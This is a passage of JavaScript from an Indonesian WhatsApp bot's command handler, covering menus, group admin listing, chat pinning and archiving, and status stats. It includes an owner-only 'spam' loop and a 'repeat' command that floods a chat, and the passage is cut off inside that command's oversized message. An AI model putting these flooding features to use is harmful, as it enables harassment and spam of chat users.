if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
let timesnya = moment(msg.messageTimestamp * 1000).format('HH:mm:ss')
const listMsg = {
buttonText: '𝐊𝐥𝐢𝐤 𝐃𝐢𝐬𝐢𝐧𝐢 ︎🌹',
footerText: `© ᴄʀᴇᴀᴛᴇᴅ ᴍᴇᴄʜᴀ ʙᴏᴛᴢ ʙʏ @${Suryaa.split('@')[0]}`,
description: `Hai kak @${sender.split('@')[0]}, ${Ucapan}\n\n${sholat}\nSilahkan pilih menu disini 🌹\n`,
sections: [
{
"title": `${timesnya} - ${tampilBulan}`,
rows: [
{
"title": "All Menu Botz",
description: `\nClick untuk menampilkan semua fitur bot`,
"rowId": `${prefix}menuall`
},
{
"title": "Creator Bot",
description: `\nClick untuk menampilkan creator mecha botz`,
"rowId": `${prefix}creator`
},
{
"title": `Rules`,
description: `\nClick untuk menampilkan rules mecha botz`,
"rowId": `${prefix}rules`
},
{
"title": "Info Menu",
description: `\nClick untuk menampilkan info menu`,
"rowId": `${prefix}infomenu`
},
{
"title": "Owner Menu",
description: `\nClick untuk menampilkan owner menu`,
"rowId": `${prefix}ownermenu`
},
{
"title": "Premium Menu",
description: `\nClick untuk menampilkan premium menu`,
"rowId": `${prefix}premiummenu`
},
{
"title": "Group Menu",
description: `\nClick untuk menampilkan group menu`,
"rowId": `${prefix}grupmenu`
},
{
"title": "Security Menu",
description: `\nClick untuk menampilkan security menu`,
"rowId": `${prefix}securitymenu`
},
{
"title": "Game Menu",
description: `\nClick untuk menampilkan game menu`,
"rowId": `${prefix}gamemenu`
},
{
"title": "Maker Menu",
description: `\nClick untuk menampilkan maker menu`,
"rowId": `${prefix}makermenu`
},
{
"title": "Serti Menu",
description: `\nClick untuk menampilkan sertifikat menu`,
"rowId": `${prefix}sertimenu`
},
{
"title": "Islam Menu",
description: `\nClick untuk menampilkan islami menu`,
"rowId": `${prefix}islammenu`
},
{
"title": "Quotes Menu",
description: `\nClick untuk menampilkan quotes menu`,
"rowId": `${prefix}quotesmenu`
},
{
"title": "Meme Menu",
description: `\nClick untuk menampilkan meme menu`,
"rowId": `${prefix}mememenu`
},
{
"title": "Random Menu",
description: `\nClick untuk menampilkan random menu`,
"rowId": `${prefix}randommenu`
},
{
"title": "Baileys Menu",
description: `\nClick untuk menampilkan baileys menu`,
"rowId": `${prefix}baileysmenu`
},
{
"title": "Tools Menu",
description: `\nClick untuk menampilkan tools menu`,
"rowId": `${prefix}toolsmenu`
},
{
"title": `Stalker Menu`,
description: `\nClick untuk menampilkan stalker menu`,
"rowId": `${prefix}stalkermenu`
},
{
"title": `Anime Menu`,
description: `\nClick untuk menampilkan anime menu`,
"rowId": `${prefix}animemenu`
},
{
"title": `Penambah Dosa`,
description: `\nClick untuk menampilkan nsfw menu`,
"rowId": `${prefix}nsfwmenu`
},
{
"title": `Fitur Baru`,
description: `\nClick untuk menampilkan fitur baru`,
"rowId": `${prefix}fiturbaru`
}
]
}],
listType: 1
}
surya.sendMessage(from, listMsg, MessageType.listMessage, {contextInfo: { mentionedJid: [sender, Suryaa, '0@s.whatsapp.net']}, quoted:fkontak})
break

case 'listadmin': case 'atasan': case 'listadmins':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isGroup) return reply(mess.only.group)
let tekslah = `List admin grup\n${groupMetadata.subject}\n\nTotal : ${groupAdmins.length}\n\n`
let no = 0
for (let admon of groupAdmins) {
no += 1
tekslah += `「 ${no.toString()} 」@${admon.split('@')[0]}\n`
}
mentions(tekslah, groupAdmins, true)
break
case 'listonline':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
//if (!isGroup) return reply(`Only group`)
let ido = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : from
let online = [...Object.keys(surya.chats.get(ido).presences), surya.user.jid]
surya.sendMessage(from, 'List Online:\n' + online.map(v => '- @' + v.replace(/@.+/, '')).join `\n`, text, {
quoted: fgc,
contextInfo: { mentionedJid: online }
})
break
case 'archive':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!fromMe) return reply('Anda Sapa')
textImg('*Succes archive chat*')
console.log('Succes archive chat = ' + from)
await sleep(3000)
surya.modifyChat(from, ChatModification.archive)
break
case 'unarchive':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!fromMe) return reply('Anda Sapa')
textImg('*Succes unarchive chat*')
console.log('Succes unarchive chat = ' + from)
await sleep(3000)
surya.modifyChat(from, ChatModification.unarchive)
break
case 'unpin':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!fromMe) return reply('Anda Sapa')
surya.modifyChat(from, ChatModification.unpin)
textImg('*Succes unpin this chat*')
console.log('unpin chat = ' + from)
break
case 'pin':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!fromMe) return reply('Anda Sapa')
surya.modifyChat(from, ChatModification.pin)
textImg('*Succes pin this chat*')
console.log('pinned chat = ' + from)
break
case 'status': case 'test':
if (isMuted) return
if (isBan) return 
for (let i = 0; i < _totalcmd.length; i ++){
const tot = _totalcmd[i].totalcmd
let totalchat = await surya.chats.all()
let sm = []
let giid = []
for (let mem of totalchat){
sm.push(mem.jid)
}
for (let id of sm){
if (id && id.includes('g.us')){
giid.push(id)
}
}
let timestampi = speed();
let latensii = speed() - timestampi
const { wa_version, mcc, mnc, os_version, device_manufacturer, device_model } = surya.user.phone
let statusbot = `
「 _*STATISTIK BOT*_ 」

*❏ Bot information*
├⟢ _*Name : © ᴍᴇᴄʜᴀ ʙᴏᴛᴢ VIP*_
├⟢ _*Type : Nodejs*_
├⟢ _*Platform : Android*_
├⟢ _*Baterai : ${baterai.baterai}% - ${baterai.cas === 'true' ? 'Charged' : 'Not charged'}*_
├⟢ _*Device : Xiaomi*_
├⟢ _*Mode : ${mode}*_
├⟢ _*Creator bot : @${Suryaa.split('@')[0]}*_
├⟢ _*Waktu : ${timesNow}*_
├⟢ _*Runtime : ${runtime(process.uptime())}*_
├⟢ _*Auto Ketik : ${autoketik}*_
├⟢ _*Auto Vn : ${autovn}*_
├⟢ _*Total Hit Bot : ${tot} Hit*_
├⟢ _*Hit Today : ${hit_today.length}*_
├⟢ _*Total User : ${pendaftar.length}*_
├⟢ _*Total Register : ${_registered.length}*_
├⟢ _*RAM : ${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB*_
├⟢ _*MCC : ${mcc}*_
├⟢ _*MNC : ${mnc}*_
├⟢ _*Versi OS : 10.1.0*_
├⟢ _*Merk HP : ${device_manufacturer}*_
├⟢ _*Versi HP : ${device_model}*_
├⟢ _*Group Chat : ${giid.length}*_
├⟢ _*Personal Chat : ${totalchat.length - giid.length}*_
├⟢ _*Total Chat : ${totalchat.length}*_
└⟢ _*Speed : ${latensii.toFixed(4)} Second*_`
surya.sendMessage(from, statusbot, text, {thumbnail: suryaImg, sendEphemeral: true, msg, contextInfo : {mentionedJid: [Suryaa, sender], forwardingScore: 100, isForwarded: true}})
}
break
case 'delthischat':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (!fromMe) return reply('Anda Sapa')
reply('*Succes delete this chat*')
textImg('succes delete chat = ' + from)
await sleep(4000)
surya.modifyChat(from, ChatModification.delete)
break
case 'tagsemua':
case 'tagall':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isGroup) return reply(mess.OnlyGrup)
//if (!isPremium) return sendButMessage(from, prem1, prem2, prem3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (!isOwner && !isOwner2 && !fromMe) return mentions(mess.OnlySurya, [Suryaa], true)
if (isGame(sender, isOwner, gcount, glimit)) return textImg(`Limit game kamu sudah habis`)
let arr = [];
let txti = `*[ TAG ALL ]*

*PESAN :* ${q ? q : ''}\n\n`
for (let i of groupMembers){
txti += `=> @${i.jid.split("@")[0]}
`
arr.push(i.jid)
}
mentions(txti, arr, true)
gameAdd(sender, glimit)
break
case 'spam':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isOwner && !isOwner2) return mentions(mess.OnlySurya, [Suryaa], true)
if (args.length < 1) return textImg(`Penggunaan ${prefix}spam teks|jumlahspam`)
let argzi = q.split("|")
if (!argzi) return textImg(`Penggunaan ${prefix}spam teks|jumlah2`)
if (isNaN(argzi[1])) return textImg(`Penggunaan ${prefix}spam teks|jumlah`)
for (let i = 0; i < argzi[1]; i++){
surya.sendMessage(from, argzi[0], MessageType.text)
}
break
case 'repeat':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isOwner && !isOwner2) return mentions(mess.OnlySurya, [Suryaa], true)
if (!q) return textImg(`Penggunaan ${prefix}repeat teks`)
textImg(`${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} 